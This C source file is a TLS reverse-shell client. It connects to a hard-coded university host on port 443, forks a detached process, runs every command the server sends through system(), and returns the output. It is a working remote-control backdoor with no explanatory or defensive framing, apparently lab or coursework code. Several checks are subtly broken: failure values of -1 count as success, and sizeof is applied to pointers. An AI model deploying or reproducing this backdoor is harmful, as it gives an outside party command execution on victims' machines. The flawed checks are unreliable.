// gcc -o client_ssl client_ssl.c -lssl -lcrypto -g
#include <arpa/inet.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <openssl/bio.h>
#include <openssl/err.h>
#include <openssl/pem.h>
#include <openssl/ssl.h>
#include <openssl/x509.h>
#include <openssl/x509_vfy.h>
#include <resolv.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#define MAX_STRING_SIZE 1024

typedef struct {
  int sslfd;
  SSL *ssl;
  SSL_CTX *sslctx;
} sslsocket;

int lookup_host(const char *host, char *adrr);
int create_socket(const char *addr, const int port, sslsocket *ssl_sock);
int execute(const char *command, int p, char *command_output);
int verify_cert_time_valid(X509 *cert);
void cleanup(sslsocket *ssl_sock, X509 *cert);
void send_msg(SSL *ssl, const char *message);
void receive_msg(SSL *ssl, char *buf);
void process(sslsocket *ssl_sock, X509 *cert);

static void display(const char *buf) { printf("Received: \"%s\"\n", buf); }

int main() {

  char dest_url[] = "sauron.run.montefiore.ulg.ac.be";
  char addr[16];
  char buf[MAX_STRING_SIZE];

  if (!lookup_host(dest_url, addr)) {
    fprintf(stderr, "lookup_host() failed\n");
    exit(1);
  }

  sslsocket *ssl_sock = malloc(sizeof(sslsocket));
  if (!ssl_sock) {
    fprintf(stderr, "malloc() failed\n");
    exit(1);
  }

  if (!create_socket(addr, 443, ssl_sock)) {
    exit(1);
  }

  X509 *cert = NULL;
  X509_NAME *certname = NULL;

  cert = SSL_get_peer_certificate(ssl_sock->ssl);
  if (cert == NULL) {
    fprintf(stderr, "Error: Could not get a certificate from: %s.\n", dest_url);
    exit(1);
  }

  certname = X509_NAME_new();
  certname = X509_get_subject_name(cert);
  if (!verify_cert_time_valid(cert)) {
    fprintf(stderr, "Certificat is expired");
    send_msg(ssl_sock->ssl, "DROP");
    receive_msg(ssl_sock->ssl, buf);
    cleanup(ssl_sock, cert);
    exit(1);
  }

  process(ssl_sock, cert);

  return (0);
}

void process(sslsocket *ssl_sock, X509 *cert) {

  int pid;
  int pipes[2];
  int recv_length, output_length;
  char command[1024];
  char command_output[1024];
  int last_cmd_len = 0;
  struct sockaddr_in sa;

  switch ((pid = fork())) {
  case -1:
    exit(EXIT_FAILURE);

  case 0:

    pipe(pipes);
    dup2(pipes[1], STDOUT_FILENO);
    dup2(pipes[1], STDERR_FILENO);
    close(pipes[1]);
    fcntl(pipes[0], F_SETFL, fcntl(pipes[0], F_GETFL) | O_NONBLOCK);

    setsid();
    SSL_write(ssl_sock->ssl, "CMD", 3);
    while (1) // TODO check if socket alive
    {
      memset(command, 0, sizeof(command));

      recv_length = SSL_read(ssl_sock->ssl, &command, sizeof(command) - 6);
      if (recv_length > 0) {
        // command[recv_length - 1] = '\0';
        if (strcmp(command, "exit") == 0) {
          break;
        }

        system(command);
        output_length = read(pipes[0], command_output, sizeof(command_output));
        // output_length = execute(command, pipes[0], command_output);

        if (output_length > 0) {
          SSL_write(ssl_sock->ssl, command_output, output_length);
        } else {
          SSL_write(ssl_sock->ssl, "0", 1);
        }
      } else {
        // Socket is closed
        break;
      }
    }

    cleanup(ssl_sock, cert);
  }
}

/* ---------------------------------------------------------- *
 * Free the structures we don't need anymore                  *
 * -----------------------------------------------------------*/
void cleanup(sslsocket *ssl_sock, X509 *cert) {
  SSL_shutdown(ssl_sock->ssl);
  SSL_free(ssl_sock->ssl);
  close(ssl_sock->sslfd);
  X509_free(cert);
  SSL_CTX_free(ssl_sock->sslctx);
}

int execute(const char *command, int p, char *command_output) {
  system(command);
  return read(p, command_output, sizeof(command_output));
}

void send_msg(SSL *ssl, const char *message) {
  if (SSL_write(ssl, message, strlen(message)) <= 0) {
    fprintf(stderr, "failed to send message");
    exit(1);
  }
}

void receive_msg(SSL *ssl, char *buf) {
  int bytes;
  memset(buf, 0, MAX_STRING_SIZE);
  bytes = SSL_read(ssl, buf, sizeof(buf)); /* get reply & decrypt */
  buf[bytes] = 0;
}

int lookup_host(const char *host, char *adrr) {
  struct addrinfo hints, *result;
  void *ptr;

  memset(&hints, 0, sizeof(hints));
  hints.ai_family = PF_UNSPEC;
  hints.ai_socktype = SOCK_STREAM;
  hints.ai_flags |= AI_CANONNAME;

  if (getaddrinfo(host, NULL, &hints, &result) != 0) {
    perror("getaddrinfo");
    return -1;
  }

  inet_ntop(result->ai_family, result->ai_addr->sa_data, adrr, 16);

  switch (result->ai_family) {
  case AF_INET:
    ptr = &((struct sockaddr_in *)result->ai_addr)->sin_addr;
    break;
  case AF_INET6:
    ptr = &((struct sockaddr_in6 *)result->ai_addr)->sin6_addr;
    break;
  }
  inet_ntop(result->ai_family, ptr, adrr, 16);

  freeaddrinfo(result);

  return 1;
}

/* ---------------------------------------------------------- *
 * create_socket() creates the socket & TCP-connect to server *
 * ---------------------------------------------------------- */
int create_socket(const char *addr, const int port, sslsocket *ssl_sock) {
  struct sockaddr_in s_addr;
  socklen_t sin_size;

  s_addr.sin_family = AF_INET;
  s_addr.sin_port = htons(port);
  s_addr.sin_addr.s_addr = inet_addr(addr);

  if ((ssl_sock->sslfd = socket(PF_INET, SOCK_STREAM, 0)) == -1) {
    perror("socket");
    return -1;
  }
  if (connect(ssl_sock->sslfd, (struct sockaddr *)&s_addr, sizeof(s_addr)) ==
      -1) {
    perror("connect");
    return -1;
  }

  if (SSL_library_init() < 0) {
    perror("SSL_library_init");
    return -1;
  }
  OpenSSL_add_all_algorithms();

  ssl_sock->sslctx = SSL_CTX_new(SSLv23_client_method());
  ssl_sock->ssl = SSL_new(ssl_sock->sslctx);

  if (!SSL_set_fd(ssl_sock->ssl, ssl_sock->sslfd)) {
    perror("SSL_set_fd");
    return -1;
  }
  if (SSL_connect(ssl_sock->ssl) != 1) {
    perror("SSL_connect");
    return -1;
  }

  return 1;
}

int verify_cert_time_valid(X509 *cert) {
  time_t t;

  t = time(0);
  if (X509_cmp_time(X509_get_notBefore(cert), &t) > 0) {
    return -1;
  }

  if (X509_cmp_time(X509_get_notAfter(cert), &t) < 0) {
    return -1;
  }

  return 1;
}